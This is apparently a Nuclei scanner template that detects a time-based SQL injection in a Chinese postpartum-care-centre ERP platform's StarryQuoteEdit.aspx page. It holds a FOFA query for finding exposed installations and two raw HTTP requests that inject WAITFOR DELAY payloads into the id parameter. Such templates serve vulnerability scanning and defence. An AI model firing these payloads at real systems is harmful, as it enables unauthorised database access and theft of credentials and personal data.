id: yueziERP-StarryQuoteEdit_aspx-sql-time

info:
  name: "月子会所ERP云平台 StarryQuoteEdit.aspx SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
      月子会所ERP管理云平台在/StarryQuoteEdit.aspx接口存在未经验证的SQL参数处理缺陷。攻击者可通过构造恶意SQL查询，绕过身份验证机制，进而访问或操作后端数据库。该漏洞允许泄露敏感数据（如管理员凭证、用户个人信息），并在高权限场景下实现服务器命令写入，最终可能导致系统权限完全沦陷。
  reference:
  - https://mp.weixin.qq.com/s/hwtQiUYb2EjZ9k_7bOS7Pw
  tags: 月子会所ERP管理云平台

http:
- raw:
  - |
    GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36

  - |
    GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
